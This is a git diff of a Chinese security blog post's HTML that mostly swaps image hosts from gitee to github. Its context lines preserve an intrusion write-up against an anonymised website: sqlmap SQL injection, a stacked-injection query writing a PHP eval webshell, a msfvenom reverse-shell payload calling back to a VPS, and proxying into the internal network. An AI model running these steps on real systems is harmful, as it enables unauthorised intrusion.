@@ -291,7 +291,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/southerose/PictureBed/raw/master/img/20220316165244.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://github.com/southerose/PictureBed/raw/master/img/20220316165244.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -448,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-03-16
+                    2022-05-28
                 </div>
                 
 
@@ -493,7 +493,7 @@
 <p>sqlmap尝试</p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://xxx.xx/" --batch --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211111105332.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211111105332.png"></p>
 <p>发现存在三种类型的注入。</p>
 <h2 id="getshell思路"><a href="#getshell思路" class="headerlink" title="getshell思路"></a>getshell思路</h2><p>到这里就有几种getshell的思路了。</p>
 <ol>
@@ -504,37 +504,37 @@
 <p>经过一番探测，该网站竟然没有后台。遂转sqlmap跑下，结果也无法–os-shell。所以后面getshell的方式，采用第三种方法。</p>
 <h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><p>通过sql语句写入一句话木马到网站目录下，我们现在先探测一下网站是什么用户，换句话说是否有足够的权限使得我们能够写文件。</p>
 <p>sqlmap -u “<a target="_blank" rel="noopener" href="http://xxx.xx/?id=1&quot;">http://xxx.xx/?id=1"</a> –batch –random-agent –is-dba</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211111105631.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211111105631.png"></p>
 <p>是管理用户。</p>
 <p>然后还得探测一下是否有绝对路径，参数值后方输入一个单引号就发现报出了绝对路径。</p>
 <pre class="line-numbers language-none"><code class="language-none">http://xxx.xx/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211111111158.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211111111158.png"></p>
 <p>知道了绝对路径，尝试构造payload语句写入一句话木马到网站根目录。（本次采用堆叠注入）</p>
 <pre class="line-numbers language-none"><code class="language-none">http://xxx.xx/?id=1;select "&lt;?php eval($_REQUEST[1]);?&gt;" into outfile 'C:\\phpStudy\\www\\outfile.php'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211111111401.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211111111401.png"></p>
 <p>访问<a target="_blank" rel="noopener" href="http://xxx.xx/outfile.php%EF%BC%8C%E5%BA%94%E8%AF%A5%E6%98%AF%E5%86%99%E5%85%A5%E6%88%90%E5%8A%9F%E4%BA%86%E3%80%82">http://xxx.xx/outfile.php，应该是写入成功了。</a></p>
 <h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>webshell管理器添加数据</p>
 <p><a target="_blank" rel="noopener" href="http://xxx.xx/outfile.php%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BA1">http://xxx.xx/outfile.php，密码为1</a></p>
 <p>蚁剑连接成功。</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211111111518.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211111111518.png"></p>
 <p>但是上去<code>whoami</code>执行后发现又是test用户权限，就非常迷。（猜测可能之前sqlmap探测出来是dba，只是说那个用户有写的权限，不一定是管理用户）</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211113102802.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211113102802.png"></p>
 <h2 id="上线msf进行提权尝试"><a href="#上线msf进行提权尝试" class="headerlink" title="上线msf进行提权尝试"></a>上线msf进行提权尝试</h2><p>然后使用msf上线的方式获得一个meterpreter</p>
 <p>1.上传msf木马（这里使用的反弹的方式，msf我部署在vps上的）</p>
 <pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=xx.xx.xx.xx lport=6543 -f exe &gt; 01.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>2.msf监听6543端口</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211113155830.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211113155830.png"></p>
 <p>注意生成木马的payload要与监听的payload一致。</p>
 <p>上传01.exe到蚁剑上执行。</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211113155642.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211113160009.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211113155642.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211113160009.png"></p>
 <p>然后拿到一个meterpreter。</p>
 <h2 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h2><p>查看端口发现开放了3389端口，尝试一番破解密码与提权操作之后均以失败告终。遂搭建socks代理，瞅瞅内网有没有东西</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211113160902.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211113165441.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211113160902.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211113165441.png"></p>
 <p>探测出了几台内网主机。传统功夫点到为止。</p>
 
                 
@@ -782,7 +782,7 @@
                 <a href="/2021/09/20/shiro550-cve-2016-4437/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211116184633.png" class="responsive-img" alt="shiro550_CVE-2016-4437">
+                        <img src="https://github.com/southerose/PictureBed/raw/master/img/20211116184633.png" class="responsive-img" alt="shiro550_CVE-2016-4437">
                         
                         <span class="card-title">shiro550_CVE-2016-4437</span>
                     </div>
@@ -830,7 +830,7 @@
                 <a href="/2021/08/21/yi-xie-ctf-ti-mu/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220316165400.png" class="responsive-img" alt="一些CTF题目">
+                        <img src="https://github.com/southerose/PictureBed/raw/master/img/20220316165400.png" class="responsive-img" alt="一些CTF题目">
                         
                         <span class="card-title">一些CTF题目</span>
                     </div>
